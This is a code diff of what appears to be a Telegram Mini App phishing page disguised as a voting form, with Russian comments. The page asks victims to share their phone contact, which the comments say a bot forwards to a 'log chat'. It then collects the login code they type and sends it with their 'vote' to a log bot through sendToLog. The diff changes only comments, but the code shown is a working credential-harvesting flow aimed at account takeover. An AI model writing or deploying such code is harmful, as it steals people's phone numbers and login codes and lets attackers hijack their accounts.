@@ -97,10 +97,8 @@
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Бот сам поймает системный контакт и перешлет его в лог-чат.
-                            // Нам не нужно читать contact.phone_number, он все равно undefined.
-                            
-                            // Просто переключаем экран на ввод кода прямо здесь
+                            // Бот сам ловит контакт и пишет в лог-чат.
+                            // Просто переключаем экран на ввод кода здесь же.
                             showCodeScreen();
                         }
                     });
@@ -135,7 +133,7 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.getElementById('code-subtitle').innerHTML = "<b>Отправка...</b>";
                         
-                        // Код отправляем через лог-бота
+                        // Отправляем код через лог-бота (без закрытия окна)
                         sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n🔑 <b>КОД:</b> ${value}`);
                         
                         setTimeout(() => {
